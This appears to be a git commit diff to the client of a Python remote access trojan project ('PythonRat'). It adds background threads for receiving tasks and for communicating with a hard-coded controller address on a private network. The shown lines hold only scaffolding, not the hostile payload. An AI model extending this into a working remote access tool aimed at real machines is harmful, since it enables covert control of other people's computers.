8b12dd961d3d97ceef7323f4bf2f4883b57dbc18
mattman059 <mattman059@gmail.com>
2022-03-01 15:54:36 -0600

    Update client.py

--- PythonRat/client.py
+++ PythonRat/client.py
@@ -1,10 +1,22 @@
 from client_class import *
+from threading import Thread
 
 def main():
     server_addr = '10.0.0.60'
     server_port = 12345
     c = Client('10.0.0.45',54321,server_addr,server_port)
 
+    threads = []
+    
+    tasking = Thread(target=c.tasking_thread)
+    tasking.daemon = True
+    threads.append(tasking)
+    tasking.start()
+ 
+    comms = Thread(target=c.comms_thread)
+    comms.daemon = True
+    threads.append(comms)
+    comms.start()
 
    
 
